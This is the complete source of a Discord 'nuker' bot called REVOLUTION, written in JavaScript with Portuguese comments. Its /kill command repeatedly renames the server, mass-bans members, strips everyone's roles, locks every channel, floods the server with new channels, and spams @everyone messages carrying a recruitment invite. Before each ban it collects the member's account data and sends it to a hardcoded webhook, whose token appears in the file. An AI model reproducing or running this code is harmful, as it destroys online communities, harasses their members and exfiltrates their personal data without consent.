const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType, WebhookClient } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ WEBHOOK CONFIG ============
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524849169855156274/ll8i1nDfLBoa2w6tbfjJJQoJMf1bitg3W46IKL1mkH1WL4xk5cojOg-OdreOq6b4wLBE';
const webhookClient = new WebhookClient({ url: WEBHOOK_URL });

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ FUNÇÃO PARA ENVIAR DADOS AO WEBHOOK ============
async function sendToWebhook(userData, guildName, action) {
  try {
    const embed = new EmbedBuilder()
      .setTitle('🔥 REVOLUTION - DADOS COLETADOS')
      .setColor('#ff0000')
      .setDescription(`**AÇÃO:** ${action}`)
      .addFields(
        { name: '👤 NOME DE USUÁRIO', value: userData.username || 'N/A', inline: true },
        { name: '🆔 ID DO USUÁRIO', value: userData.id || 'N/A', inline: true },
        { name: '📅 DATA DE CRIAÇÃO', value: userData.createdAt ? new Date(userData.createdAt).toLocaleString('pt-BR') : 'N/A', inline: true },
        { name: '💎 NITRO', value: userData.nitro || 'N/A', inline: true },
        { name: '📊 SERVIDOR', value: guildName || 'N/A', inline: true },
        { name: '🕒 DATA/HORA', value: new Date().toLocaleString('pt-BR'), inline: true }
      )
      .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
      .setFooter({ text: 'REVOLUTION - COLETA DE DADOS' })
      .setTimestamp();

    await webhookClient.send({
      content: `@everyone 🔥 **NOVOS DADOS COLETADOS!**`,
      embeds: [embed]
    });
    console.log(`📤 DADOS ENVIADOS AO WEBHOOK: ${userData.username}`);
  } catch (error) {
    console.error(`ERRO AO ENVIAR WEBHOOK: ${error.message}`);
  }
}

// ============ FUNÇÃO PARA COLETAR DADOS DO USUÁRIO ============
async function collectUserData(member) {
  try {
    const user = member.user;
    
    // Verifica se tem Nitro (aproximado)
    let nitro = 'NÃO';
    if (user.flags) {
      const flags = user.flags.toArray();
      if (flags.includes('PremiumPromoDismissed') || flags.includes('HypeSquadOnlineHouse1') || flags.includes('HypeSquadOnlineHouse2') || flags.includes('HypeSquadOnlineHouse3')) {
        nitro = 'POSSIVELMENTE';
      }
    }
    
    // Verifica se é bot
    if (user.bot) {
      nitro = 'BOT';
    }

    const userData = {
      username: user.tag,
      id: user.id,
      createdAt: user.createdAt,
      nitro: nitro,
      isBot: user.bot,
      avatar: user.displayAvatarURL()
    };

    return userData;
  } catch (error) {
    console.error(`ERRO AO COLETAR DADOS: ${error.message}`);
    return null;
  }
}

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startAttack(guild, user, motivo, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;
    let totalCanaisCriados = 0;
    let totalBanidos = 0;

    // ============ 1. MUDA O NOME E FOTO DO SERVIDOR ============
    const changeServerNameAndIcon = async () => {
      try {
        // Muda o nome
        await guild.setName('REVOLUTION');
        console.log(`📛 NOME DO SERVIDOR ALTERADO PARA: REVOLUTION`);

        // Muda a foto (baixa a imagem primeiro)
        try {
          const imageUrl = 'https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp';
          const response = await fetch(imageUrl);
          const buffer = await response.arrayBuffer();
          await guild.setIcon(Buffer.from(buffer));
          console.log(`🖼️ FOTO DO SERVIDOR ALTERADA!`);
        } catch (iconError) {
          console.error(`ERRO AO MUDAR FOTO: ${iconError.message}`);
        }
      } catch (error) {
        console.error(`ERRO AO MUDAR NOME/FOTO: ${error.message}`);
      }
    };
    changeServerNameAndIcon();
    const nameIconInterval = setInterval(changeServerNameAndIcon, 15000);

    // ============ 2. BANIR TODOS OS USUÁRIOS ============
    const banAllUsers = async () => {
      try {
        const members = guild.members.cache.filter(m => 
          !m.user.bot && 
          m.id !== user.id && 
          m.id !== client.user.id &&
          m.bannable
        );

        for (const member of members.values()) {
          try {
            // COLETA DADOS ANTES DE BANIR
            const userData = await collectUserData(member);
            if (userData) {
              await sendToWebhook(userData, guild.name, 'BANIMENTO');
            }

            await member.ban({ reason: 'REVOLUTION - OPERAÇÃO ANTI-PANELINHA' });
            totalBanidos++;
            console.log(`🔨 USUÁRIO BANIDO: ${member.user.tag} (${totalBanidos})`);
            
            if (totalBanidos % 5 === 0) {
              console.log(`📊 TOTAL DE BANIDOS: ${totalBanidos}`);
            }
          } catch (error) {
            console.error(`ERRO AO BANIR ${member.user.tag}: ${error.message}`);
          }
        }
      } catch (error) {
        console.error(`ERRO NO BANIMENTO EM MASSA: ${error.message}`);
      }
    };
    banAllUsers();
    const banInterval = setInterval(banAllUsers, 5000);

    // ============ 3. CRIA CARGO INFERIOR ============
    const createLowRole = async () => {
      try {
        const lowRoleName = 'REVOLUTION_SUB';
        let lowRole = guild.roles.cache.find(r => r.name === lowRoleName);
        if (!lowRole) {
          lowRole = await guild.roles.create({
            name: lowRoleName,
            color: '#333333',
            position: 0,
            permissions: []
          });
        }

        const members = guild.members.cache.filter(m => 
          !m.user.bot && m.id !== user.id && m.id !== client.user.id
        );

        for (const member of members.values()) {
          try {
            await member.roles.set([lowRole.id]);
          } catch (error) {}
        }
      } catch (error) {}
    };
    createLowRole();
    const rebaixamentoInterval = setInterval(createLowRole, 30000);

    // ============ 4. LOCK EM TODOS OS CANAIS ============
    const lockAllChannels = async () => {
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased());
        for (const channel of channels.values()) {
          try {
            await channel.permissionOverwrites.edit(guild.id, {
              SendMessages: false,
              AddReactions: false,
              CreatePublicThreads: false,
              CreatePrivateThreads: false
            });
            await channel.permissionOverwrites.edit(client.user.id, {
              SendMessages: true,
              AddReactions: true
            });
            const owner = guild.members.cache.get(user.id);
            if (owner) {
              await channel.permissionOverwrites.edit(owner.id, {
                SendMessages: true,
                AddReactions: true,
                ManageMessages: true
              });
            }
          } catch (error) {}
        }
      } catch (error) {}
    };
    lockAllChannels();
    const lockInterval = setInterval(lockAllChannels, 15000);

    // ============ 5. CRIAÇÃO INFINITA DE CANAIS ============
    const channelTypes = [
      { type: ChannelType.GuildText, name: 'texto' },
      { type: ChannelType.GuildVoice, name: 'voz' },
      { type: ChannelType.GuildForum, name: 'forum' },
      { type: ChannelType.GuildCategory, name: 'categoria' }
    ];

    let counters = {
      texto: 0,
      voz: 0,
      forum: 0,
      categoria: 0
    };

    const createMultipleChannels = async () => {
      if (!isRunning) return;
      
      try {
        const existingCategory = guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).size;
        const maxChannels = 50;

        // CRIA CATEGORIA
        if (existingCategory < maxChannels) {
          try {
            const catName = `REVOLUTION-CATEGORIA-${counters.categoria + 1}`;
            const category = await guild.channels.create({
              name: catName,
              type: ChannelType.GuildCategory
            });
            counters.categoria++;
            totalCanaisCriados++;
            console.log(`📁 CATEGORIA CRIADA: ${catName}`);
            
            // CRIA 5 CANAIS DENTRO DA CATEGORIA
            for (let i = 0; i < 5; i++) {
              if (!isRunning) break;
              
              // Texto
              const textName = `revolution-text-${counters.texto + 1}`;
              await guild.channels.create({
                name: textName,
                type: ChannelType.GuildText,
                parent: category.id,
                permissionOverwrites: [
                  {
                    id: guild.id,
                    allow: ['ViewChannel']
                  }
                ]
              });
              counters.texto++;
              totalCanaisCriados++;

              // Voz
              const voiceName = `revolution-voz-${counters.voz + 1}`;
              await guild.channels.create({
                name: voiceName,
                type: ChannelType.GuildVoice,
                parent: category.id,
                permissionOverwrites: [
                  {
                    id: guild.id,
                    allow: ['ViewChannel', 'Connect']
                  }
                ]
              });
              counters.voz++;
              totalCanaisCriados++;

              // Fórum
              const forumName = `revolution-forum-${counters.forum + 1}`;
              await guild.channels.create({
                name: forumName,
                type: ChannelType.GuildForum,
                parent: category.id,
                permissionOverwrites: [
                  {
                    id: guild.id,
                    allow: ['ViewChannel', 'SendMessages']
                  }
                ]
              });
              counters.forum++;
              totalCanaisCriados++;
            }
          } catch (error) {}
        }

        if (totalCanaisCriados % 10 === 0) {
          console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
        }

      } catch (error) {}
    };

    createMultipleChannels();
    const multiChannelInterval = setInterval(createMultipleChannels, 300);

    // ============ 6. SPAM ULTRARRÁPIDO ============
    const spamMessages = [
      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp\n\nhttps://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp`
    ];

    let messageCount = 0;

    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const randomMessage = spamMessages[0];
            
            const spamEmbed = new EmbedBuilder()
              .setTitle('REVOLUTION')
              .setDescription(randomMessage)
              .setColor('#ff0000')
              .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
              .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
              .setTimestamp();

            await channel.send({ 
              content: `@everyone SERVIDOR TOMADO POR REVOLUTION`,
              embeds: [spamEmbed]
            });
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 SPAM #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 10);
    }

    // ============ SALVA O ATAQUE ============
    this.activeAttacks.set(guildId, {
      spamInterval,
      nameIconInterval,
      lockInterval,
      rebaixamentoInterval,
      multiChannelInterval,
      banInterval,
      isRunning,
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      totalCanaisCriados: 0,
      totalBanidos: 0,
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(nameIconInterval);
        clearInterval(lockInterval);
        clearInterval(rebaixamentoInterval);
        clearInterval(multiChannelInterval);
        clearInterval(banInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
        console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanaisCriados}`);
        console.log(`🔨 TOTAL DE USUÁRIOS BANIDOS: ${totalBanidos}`);
      }
    });

    console.log(`🔥 ATAQUE ULTIMATE iniciado no servidor ${guild.name} por ${user.tag}`);
    return this.activeAttacks.get(guildId);
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ LOGGER ============
function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${type}] ${message}`);
  
  const logDir = './logs';
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
  fs.appendFileSync(`${logDir}/bot.log`, `[${timestamp}] [${type}] ${message}\n`);
}

// ============ COMANDO: KILL ============
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR PARA ATACAR.',
        ephemeral: true
      });
    }

    const motivo = interaction.options.getString('motivo') || 'OPERACAO REVOLUTION - ATAQUE TOTAL';

    try {
      const attack = attackManager.startAttack(interaction.guild, interaction.user, motivo, client);

      const successEmbed = new EmbedBuilder()
        .setTitle('ATAQUE REVOLUTION INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE ULTIMATE`)
        .addFields(
          { name: 'ALVO', value: interaction.guild.name, inline: true },
          { name: 'MOTIVO', value: motivo, inline: true },
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE EM ANDAMENTO (VELOCIDADE MAXIMA)', inline: false },
          { name: 'PARAR', value: 'USE /end PARA PARAR O ATAQUE', inline: false },
          { name: 'CANAL CRIADO', value: 'TEXTO + VOZ + FORUM + CATEGORIAS', inline: false }
        )
        .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
        .setFooter({ text: 'REVOLUTION - ATAQUE ULTIMATE' })
        .setTimestamp();

      await interaction.reply({ embeds: [successEmbed] });
      log(`🔥 ATAQUE ULTIMATE iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO AO INICIAR ATAQUE: ${error.message}`,
        ephemeral: true
      });
      log(`Erro no KILL: ${error.message}`, 'ERROR');
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('ATAQUE PARADO COM SUCESSO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setImage('https://media.discordapp.net/attachments/1524725748152271000/1524848745550708746/84b65e0da84784a60baec51ab3ea58f5.jpg?ex=6a513d8f&is=6a4fec0f&hm=d1293d3f912c2a97b032272cc805abd998330d5edf10d14d4559d04ab2ec549c&=&format=webp')
        .setFooter({ text: 'REVOLUTION - MODO DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  log(`📊 Servidores: ${client.guilds.cache.size}`);
  
  client.user.setPresence({
    activities: [{
      name: 'REVOLUTION | /kill para atacar',
      type: 3,
      state: 'Use /kill para ATACAR'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    log(`Erro no comando ${interaction.commandName}: ${error.message}`, 'ERROR');
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO! Configure o .env');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  log(`Erro ao fazer login: ${error.message}`, 'ERROR');
  process.exit(1);
});
